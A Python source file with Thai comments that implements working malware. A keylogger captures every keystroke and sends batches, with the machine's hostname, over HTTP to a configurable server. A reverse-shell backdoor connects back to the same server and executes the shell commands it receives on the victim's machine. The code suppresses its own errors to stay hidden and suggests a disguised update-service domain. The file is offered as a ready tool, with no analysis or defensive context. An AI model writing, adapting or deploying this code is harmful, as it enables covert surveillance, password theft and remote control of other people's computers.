import os
import platform
import socket
import subprocess
import threading
import time
import http.client
from pynput import keyboard, mouse
import json

# <<< แก้ URL นี้ให้เป็น IP ของ Server คุณ >>>
SERVER_IP = "192.168.1.100"  # หรือ Domain เช่น api-update-service.com
SERVER_PORT = 8080

class Keylogger:
    def __init__(self):
        self.keys = []
        self.log_file = "keylog.txt"
    
    def on_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                current_key = " "
            elif key == keyboard.Key.enter:
                current_key = "\n"
            else:
                current_key = str(key)
        
        self.keys.append(current_key)
        # บันทึกลงไฟล์ทันที
        with open(self.log_file, "a") as f:
            f.write(current_key)
        
        # ส่งข้อมูลไปยัง Server ทุก 5 ตัวอักษร หรือเมื่อมี Enter
        if len(self.keys) >= 5 or key == keyboard.Key.enter:
            self.send_to_server("".join(self.keys))
            self.keys = []

    def send_to_server(self, data):
        try:
            conn = http.client.HTTPConnection(SERVER_IP, SERVER_PORT, timeout=5)
            headers = {"Content-type": "text/plain", "X-Client-ID": get_hostname()}
            conn.request("POST", "/stream", body=data, headers=headers)
            response = conn.getresponse()
            conn.close()
        except Exception as e:
            pass  # ซ่อน Error ถ้าเน็ตไม่เข้า

    def start(self):
        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()
        listener.join()

def get_hostname():
    return platform.node()

def reverse_shell():
    """Backdoor: เชื่อมต่อกลับไปยัง Server เพื่อรับคำสั่ง"""
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_IP, SERVER_PORT))
            
            while True:
                command = s.recv(1024).decode()
                if not command:
                    break
                
                # สั่งให้รัน Command บนเครื่องเหยื่อ
                if command.startswith("exec:"):
                    cmd = command[5:]
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                    s.sendall(result.stdout.encode())
                    s.sendall(result.stderr.encode())
                
                time.sleep(0.1)
            
            s.close()
            time.sleep(5)  # รอถ้า Connection หาย
        
        except Exception as e:
            time.sleep(5)

if __name__ == "__main__":
    # เริ่ม Keylogger ใน Thread แยก
    keylogger_thread = threading.Thread(target=Keylogger().start)
    keylogger_thread.daemon = True
    keylogger_thread.start()
    
    # เริ่ม Reverse Shell ใน Thread แยก
    shell_thread = threading.Thread(target=reverse_shell)
    shell_thread.daemon = True
    shell_thread.start()
    
    print(f"[+] Keylogger & Backdoor Running... Connected to {SERVER_IP}")
    
    # Keep main thread alive
    while True:
        time.sleep(1)